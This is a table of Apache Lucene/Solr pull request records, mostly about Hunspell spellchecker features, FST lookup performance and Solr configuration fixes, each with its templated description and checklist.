"","2386","LUCENE-9781: Speed up BytesStore reader setPosition","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  It's a hot spot, called a lot during FST arc reading  # Solution  Go to ArrayList only when it's necessary. This speeds up org.apache.lucene.analysis.hunspell.TestPerformance#en by ~8%  # Tests  No new tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-17T09:07:13Z","2021-02-17T13:27:01Z"
"","1775","SOLR-14767 : fix long field parsing from string","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Int and Long fields when passed as a string should consider all possible value formats and not throw NumberFormatException  # Solution  Use Double.parse as a fallback when it fails  # Tests  added a test to index with values as `42.2` which should not cause NumberFormatException  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","apoorvprecisely","2020-08-23T10:05:25Z","2020-09-29T13:53:34Z"
"","2406","SOLR-15169: SolrPaths.assertPathAllowed normalization problem","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  In the SolrPaths.assertPathAllowed the normalize() method is only called for pathToAssert and not for the allowPaths elements  # Solution  Calling it for allowPaths elements  # Tests  Unit tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","asalamon74","2021-02-19T12:44:20Z","2021-04-11T16:22:49Z"
"","2247","LUCENE-9476 Add getBulkPath API for the Taxonomy index","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  In [LUCENE-9450](https://issues.apache.org/jira/browse/LUCENE-9450) we switched the Taxonomy index from Stored Fields to `BinaryDocValues.` In the resulting implementation of the `getPath` code, we create a new `BinaryDocValues`'s values instance for each ordinal.  It may happen that we may traverse over the same nodes over and over again if the `getPath` API is called multiple times for ordinals in the same segment/with the same `readerIndex`.  This PR takes advantage of that fact by sorting ordinals and then trying to find out if some of the ordinals are present in the same segment/have the same `readerIndex` (by trying to `advanceExact` to the correct position and not failing) thereby allowing us to reuse the previous `BinaryDocValues` object.    # Solution  Steps: 1. Sort all ordinals and remember their position so as to store the path in the correct position 2. Try to `advanceExact` to the correct position with the previously calculated `readerIndex`. If the operation fails, try to find the correct segment for the ordinal and then `advanceExact` to the desired position. 3. Store this position for future ordinals.  # Tests  Added a new test for the API that compares the individual `getPath` results from ordinals with the bulk FacetLabels returned by the `getBulkPath` API  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gautamworah96","2021-01-26T04:32:52Z","2021-06-09T01:58:15Z"
"","2169","SOLR-14723: Remove the class attribute for the caches in the _default/example configsets","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  In 8.x branch, the default and example configsets include LRUCache and FastLRUCache as the implementation for the various caches. Those implementations are deprecated.  # Solution  Remove the attribute completely and let the default take over (as it's in master), this should make upgrading configsets easier.  # Tests  _ant test_  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","trdillon","2020-12-27T07:14:33Z","2020-12-31T06:13:11Z"
"","2374","LUCENE-9769: Hunspell: KEEPCASE should take precedence over affixed forms","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  If an inflected form is listed in the dictionary like KEEPCASE, its other variations should be considered misspelled, even if affix removal would result in a non-KEEPCASE root  # Solution  Move case check to the `RootProcessor` and make the spellchecking's one stop if it isn't satisfied. Disregard `KEEPCASE` in `Stemmer` to make it more consistent with ""hunspell -s"", move the code to `Hunspell`  # Tests  `keepcase` appended with the scenario in question. `forbiddenword` appended as well, with a non-unit-tested case that started to fail on a real corpus after some intermediate version of the keepcase change.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T19:35:12Z","2021-02-18T09:14:48Z"
"","2341","LUCENE-9759: Hunspell: add more to TestHunspellRepositoryTestCases.EXPECTED_FAILURES","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  I've found more Hunspell repo tests either out of my immediate scope, or because they rely on dubious Hunspell's behavior  # Solution  Mark them as failing  # Tests  A test-only change :)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T08:48:27Z","2021-02-11T08:29:14Z"
"","2220","LUCENE-8626: Lucene standardize tests part 3 and final","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  I've added the final set of standardizations to test files in Lucene so that they conform to the new pattern.  # Solution  Lead with Test instead of `{something}Test.java`  # Tests  All files here are test classes.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2021-01-19T07:22:47Z","2021-01-22T17:38:53Z"
"","1957","SOLR-14918 add ""failIfEmptyCores"" param for healthcheck handler","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  I add ""failIfEmptyCores""  option for HealthCheckHandler. For detail, please see below. https://issues.apache.org/jira/browse/SOLR-14918  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  when ""failIfEmptyCores"" option send to HealthCheckHandler, it checks the core is empty or not.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","miyazakt","2020-10-07T07:31:44Z","2020-10-07T07:32:42Z"
"","2238","LUCENE-9693: Hunspell: check that all flags are > 0 and fit char range","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell: check that all flags are > 0 and fit char range, as Hunspell does  # Solution  1. Add a corresponding assertion 2. Fix HIDDEN_FLAG serialization bug found by this assertion 3. Use char instead of int to store and pass flags around, because now we can use 0 for an unset flag instead of -1  # Tests  No new tests, but some tests failed after implementing step 1 and were fixed in step 2  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-22T12:19:32Z","2021-01-26T11:19:26Z"
"","2249","LUCENE-9700: Hunspell: support words with trailing dots","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell/C++ has some special treatment for abbreviations  # Solution  Mimic the same behavior: remove all trailing dots and stem the word without any dots or with just one dot.  # Tests  From Hunspell repo: `base` taken as is, `keepcase` merged into the existing same-named test.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-26T12:49:35Z","2021-01-29T08:14:33Z"
"","2228","LUCENE-9684: Hunspell: support COMPOUNDRULE","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell uses COMPOUNDRULE e.g. for ordinal numbers in en-US dictionary (1st, 42nd, etc)  # Solution  COMPOUNDRULE is a regexp-like pattern over word parts flags. I've reimplemented Hunspell's logic, which breaks the word into parts in different ways and checks whether any COMPOUNDRULE matches them (commit 1). To support uppercase, I had also to repeat `Stemmer`'s case variations (commit 3). While doing this, I discovered a bug in all-caps treatment where HIDDEN flag didn't play well with non-single-character flag formats, which I fixed (commit 2).  # Tests  All `compoundrule*` tests taken from Hunspell repository, plus a randomized test for flag serialization and deserialization.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-21T13:15:50Z","2021-01-22T11:41:54Z"
"","2224","LUCENE-9681: Hunspell spellchecker: support numbers with separators","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell supports numbers like `42` or `111.222`, but only for spellchecking, without any stemming. Lucene should, too.  # Solution  Copy the corresponding logic from Hunspell C++.  # Tests  The test is taken from Hunspell C++ as well.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-20T12:57:55Z","2021-01-21T12:54:10Z"
"","2425","LUCENE-9808: Hunspell suggestions: consider space/dash-separated words for each case variation","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell suggests space/dash-separated words if there's no ""good"" suggestions, where ""good"" is calculated separately for each case variation. We should do the same.  # Solution  Make `hasGoodSuggestions` a local variable instead of a field.  Also fix suggestion order mismatch found by the test: Hunspell moves uppercase-after-space suggestions to the top.  # Tests  `sug2` (being about space/dash separation) expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-24T10:27:00Z","2021-02-24T17:46:58Z"
"","2294","LUCENE-9721: Hunspell: disallow ONLYINCOMPOUND suffixes at the very end of compound words","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has some special logic for these suffixes, which are only allowed depending on prefix presence  # Solution  Replicate this logic  # Tests  `onlyincompound2` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-03T09:08:03Z","2021-02-03T17:28:47Z"
"","2352","LUCENE-9764: Hunspell: try title case as FORCEUCASE misspelled word suggestions","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has a special branch in `suggest` for `FORCEUCASE` words  # Solution  Replicate that logic  # Tests  `forceucase.sug` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-11T08:44:17Z","2021-02-11T17:10:00Z"
"","2414","LUCENE-9800: Hunspell: put a time limit on suggestion calculation","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has a number of time limits to ensure it doesn't take forever applying potentially exponential rules  # Solution  Add an equivalent of its `#define TIMELIMIT_GLOBAL (CLOCKS_PER_SEC / 4)` for suggestions. Later we'll see if we need other time limits.  # Tests  `TestHunspell.testSuggestionTimeLimit`. It also became possible to raise the number of checked words in `TestPerformance.fr`: before even the second misspelled word took 15 seconds to `suggest`.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-22T12:30:35Z","2021-02-22T19:17:18Z"
"","2320","LUCENE-9742: Hunspell: suggest dictionary entries similar to the misspelled word","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has ""ngram-based suggestions"" where the dictionary is enumerated, forms are derived, and checked whether the result is similar to the misspelled word.  # Solution  Here I start implementing this functionality, without affixes so far.  # Tests  3 suggestion tests from Hunspell repo are now added  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-08T10:28:37Z","2021-02-09T07:57:35Z"
"","1938","SOLR-14659: Remove restlet as dependency for the ManagedResource API","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Here’s a quick pass at keeping the existing ManagedResource API endpoints in place but without using Restlet. Now that I’ve gone through this code again, it seems like Restlet was more aspirational than technically required to support the current functionality. As I said on the mailing list, I don’t know the history of why Restlet was introduced so I can’t say much more about that.   What I do know is that it’s not needed to support the ManagedResource endpoints we have today. In a nutshell, RestManager keeps a mapping from a PATH (e.g. /schema/analysis/stopwords/english) to a ManagedResource impl and Restlet is used to route REST requests for the PATH to a ManagedResource. There’s a ManagedEndpoint used as the shim between Restlet and the ManagedResource that’s just details ...  In this PR, I’ve simply replaced the Restlet routing logic with a SolrRequestHandler that resolves the ManagedResource for a PATH using the RestManager’s mapping. Put simply, plugging into the Restlet routing logic isn’t necessary for Managed Resources. Not to mention, there’s some rigid mapping to /schema in places, so I’m not certain we achieved the supposed goal of supporting dynamic mapping of path to resource that Restlet provides.  As has been discussed on the mailing list, we could just remove all of this ManagedResource code from master but that requires us to come up with some LTR specific request handler to allow managing models and features. However, the approach in this PR doesn’t feel too dirty to me and avoids breaking the existing APIs for stopwords / synonyms / LTR models & features.  I’m happy to go either way here but wanted to see what it would take to remove Restlet but keep the existing endpoints and this work accomplishes that.   # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-10-01T23:51:02Z","2020-10-05T02:41:13Z"
"","2248","LUCENE-9699: Support German-like compound words","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  German compounds are complicated and need to be supported by Hunspell.  # Solution  * Supported affix file options like COMPOUNDBEGIN, COMPOUNDMIDDLE, COMPOUNDEND, COMPOUNDPERMIT etc. * Break words into components like for COMPOUNDRULE, but allow affixes and check all these flags instead * To reduce allocations when breaking words everywhere, allow to stem words starting at non-zero offsets in `char[] and pass `offset` everywhere  # Tests  `germancompounding` from Hunspell repository  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-26T12:41:13Z","2021-01-28T08:16:34Z"
"","2405","LUCENE-9790: Hunspell: avoid slow dictionary lookup if the word's hash isn't there","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  FST traversal is the hottest spot in Hunspell, let's call it less frequently  # Solution  Add a hash-based Bloom filter before FST traversal to avoid it.  # Tests  None. `TestPerformance.de` became ~30% faster, `fr` and `en` — ~15% faster.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-19T09:16:11Z","2021-02-19T20:08:40Z"
"","2459","LUCENE-9825: Hunspell: reverse the ""words"" trie for faster word lookup/suggestions","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  FST lookup and especially traversal are too slow  # Solution  Replace FST with a similarly-shaped trie-like data structure, but with nodes referring to their parents instead of their children, plus a hash map into its leaves. I suspect such data structure has a name, but couldn't find it.  # Tests  No new tests, but this makes some notable performance-related changes in existing ones: ~25% speedup in `TestAllDictionaries`: no word FST compiling during dictionary loading now ~35% speedup in `TestPerformance`: lookup/enumeration have become faster; stemming/spellchecking/suggestions are affected to varying degrees, e.g. 45-50% speedup for English But this has some cost: ~70% more memory on average as printed by `TestAllDictionaries` on 178 wooorm/libre dictionaries.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-03-05T15:12:20Z","2021-03-11T01:17:08Z"
"","2262","LUCENE-9706: Hunspell: support NEEDAFFIX flag on affixes","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  From `man hunspell`:  > This flag signs virtual stems in the dictionary, words only valid when affixed. Except, if the dictionary word has a homonym or a zero affix. NEEDAFFIX works also with prefixes and prefix + suffix combinations (see tests/needaffix5.*)  # Solution  Don't consider dictionary entries if we just stripped an affix with `NEEDAFFIX` flag  # Tests  The aforementioned `tests/needaffix5.*`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-28T14:07:34Z","2021-01-29T08:14:26Z"
